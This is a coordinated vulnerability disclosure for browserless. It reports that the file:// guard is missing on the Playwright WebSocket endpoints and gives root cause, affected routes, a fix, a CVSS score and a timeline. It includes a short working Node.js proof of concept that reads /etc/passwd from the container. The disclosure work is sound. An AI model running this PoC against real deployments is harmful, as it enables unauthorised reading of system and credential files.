https://github.com/browserless/browserless

## Finding: ALLOW_FILE_PROTOCOL=false not enforced on Playwright WebSocket endpoints -- arbitrary local file read

### Summary

There is a security issue in browserless where the ALLOW_FILE_PROTOCOL=false guard is not applied to the Playwright-based WebSocket endpoints, allowing any token holder to read arbitrary files from the container filesystem.

Background: browserless v1.44.0 introduced ALLOW_FILE_PROTOCOL (default false) to block file:// requests "due to security concerns." The guard works correctly for CDP-based routes. It does not work for Playwright routes.

Root cause: The file:// check lives only in browsers.cdp.ts (src/browsers/browsers.cdp.ts, lines 109-135) in the onTargetCreated handler. The Playwright browser class (src/browsers/browsers.playwright.ts, BasePlaywright and subclasses ChromiumPlaywright, FirefoxPlaywright, WebKitPlaywright) has no equivalent check and never calls getAllowFileProtocol().

Affected endpoints (all require a valid token):
- /playwright/chromium and /chromium/playwright
- /playwright/firefox and /firefox/playwright
- /playwright/webkit and /webkit/playwright

Reproduction (ghcr.io/browserless/chromium:latest, commit a77657a, v2.50.1):

Start the container with no ALLOW_FILE_PROTOCOL override:

  docker run -p 3333:3000 -e TOKEN=mytoken ghcr.io/browserless/chromium:latest

PoC (Node.js, playwright-core):

  const { chromium } = require('playwright-core');
  const browser = await chromium.connect(
    'ws://localhost:3333/playwright/chromium?token=mytoken'
  );
  const page = await browser.newPage();
  await page.goto('file:///etc/passwd');
  const text = await page.evaluate(() => document.body.innerText);
  console.log(text);
  // Output: root:x:0:0:root:/root:/bin/bash  (full /etc/passwd contents)

Contrast -- the CDP content endpoint correctly blocks the same URL:

  curl -H "Authorization: Bearer mytoken" \
       -H "Content-Type: application/json" \
       -d '{"url":"file:///etc/passwd"}' \
       http://localhost:3333/content
  # Error: Navigating frame was detached

Suggested fix: add the same file:// guard to browsers.playwright.ts, or centralise the check in BrowserManager before handing a browser instance to any route handler.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (7.7 High)
CWE-863 Incorrect Authorization


### Disclosure

 - 1 June 2026 - reported via email
 - 2 June 2026 - report accepted and complimented
 - 2 July 2026 - followed up for updates
 - 7 July 2026 - confirmed it's being fixed
 - 7 July 2026 - coordinating disclosure
 - 27 August 2026 - final follow up
 - 17 September 2026 - disclosed
